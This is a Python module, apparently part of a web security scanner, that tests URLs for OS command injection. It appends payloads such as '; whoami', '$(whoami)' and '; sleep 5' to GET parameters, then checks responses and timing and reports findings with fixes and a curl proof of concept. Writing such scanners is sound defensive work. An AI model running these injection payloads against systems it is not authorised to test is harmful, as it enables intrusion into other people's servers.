"""
Command Injection Exploitation Module.
Tests for OS command injection vulnerabilities.
"""
import re
import time
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import requests
from dataclasses import dataclass

logger = logging.getLogger(__name__)

# Command injection payloads
CMD_PAYLOADS = {
    'unix': [
        '; whoami',
        '| whoami',
        '`whoami`',
        '$(whoami)',
        '; id',
        '| id',
        '; sleep 5',
        '| sleep 5',
    ],
    'windows': [
        '& whoami',
        '&& whoami',
        '| whoami',
        '; whoami',
        '& timeout /t 5',
    ]
}

# Response patterns indicating successful command execution
CMD_INDICATORS = [
    r'uid=\d+',  # Linux id command
    r'gid=\d+',
    r'root|www-data|apache|nginx',  # Common user names
    r'nt authority\\system',  # Windows
]

@dataclass
class CmdInjResult:
    url: str
    parameter: str
    payload: str
    success: bool
    evidence: str
    method: str = 'GET'

class CommandInjectionExploiter:
    """Active command injection testing engine."""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0'
        })
    
    def exploit(self, url: str) -> List[CmdInjResult]:
        """Test for command injection vulnerabilities."""
        results = []
        
        # Test GET parameters
        results.extend(self._test_get_parameters(url))
        
        return results
    
    def _test_get_parameters(self, url: str) -> List[CmdInjResult]:
        """Test command injection in GET parameters."""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            params = {'file': ['test.txt'], 'cmd': ['ls'], 'exec': ['date']}
        
        for param_name in params:
            logger.info(f"Testing command injection in: {param_name}")
            
            # Test direct command injection
            for os_type, payloads in CMD_PAYLOADS.items():
                for payload in payloads:
                    test_url = self._build_test_url(url, param_name, payload, params)
                    
                    try:
                        start = time.time()
                        response = self.session.get(test_url, timeout=self.timeout + 6)
                        elapsed = time.time() - start
                        
                        # Check for command output
                        if self._detect_command_output(response.text):
                            logger.warning(f"Command injection found in {param_name}")
                            results.append(CmdInjResult(
                                url=test_url,
                                parameter=param_name,
                                payload=payload,
                                success=True,
                                evidence=self._extract_evidence(response.text),
                                method='GET'
                            ))
                            break
                        
                        # Check for time-based blind (sleep/timeout)
                        if 'sleep' in payload.lower() or 'timeout' in payload.lower():
                            if 4 < elapsed < 7:
                                logger.warning(f"Time-based command injection in {param_name}")
                                results.append(CmdInjResult(
                                    url=test_url,
                                    parameter=param_name,
                                    payload=payload,
                                    success=True,
                                    evidence=f"Command delayed response by {elapsed:.2f}s",
                                    method='GET'
                                ))
                                break
                    
                    except requests.Timeout:
                        if 'sleep' in payload.lower():
                            results.append(CmdInjResult(
                                url=test_url,
                                parameter=param_name,
                                payload=payload,
                                success=True,
                                evidence="Request timed out after sleep injection",
                                method='GET'
                            ))
                    except Exception as e:
                        logger.debug(f"Command injection test failed: {e}")
        
        return results
    
    def _build_test_url(self, url: str, param: str, payload: str, params: dict) -> str:
        """Build test URL with injected payload."""
        parsed = urlparse(url)
        test_params = params.copy()
        original_value = test_params[param][0] if test_params[param] else ''
        test_params[param] = [original_value + payload]
        
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            urlencode(test_params, doseq=True),
            parsed.fragment
        ))
    
    def _detect_command_output(self, html: str) -> bool:
        """Detect command execution in response."""
        for pattern in CMD_INDICATORS:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        return False
    
    def _extract_evidence(self, html: str) -> str:
        """Extract command output evidence."""
        for pattern in CMD_INDICATORS:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(html), match.end() + 100)
                return html[start:end]
        return ""


def run_command_injection_exploitation(url: str) -> List[Dict[str, Any]]:
    """Run command injection exploitation."""
    exploiter = CommandInjectionExploiter()
    results = exploiter.exploit(url)
    
    findings = []
    for result in results:
        if result.success:
            findings.append({
                'issue': 'OS Command Injection',
                'severity': 'CRITICAL',
                'category': 'command_injection',
                'impact': f'Command injection in parameter "{result.parameter}". Attacker can execute arbitrary OS commands on the server.',
                'description': f'OS command injection found. The server executes injected commands without sanitization.',
                'recommendation': 'Never pass user input directly to system commands. Use allowlists and avoid shell execution. Use safe APIs instead.',
                'affected_element': f'{result.method} {result.parameter}',
                'score_impact': 35,
                'evidence': result.evidence,
                'poc': f'# Command Injection\ncurl "{result.url}"\n# Payload: {result.payload}',
                'confidence': 'HIGH'
            })
    
    logger.info(f"Command Injection: Found {len(findings)} vulnerabilities")
    return findings
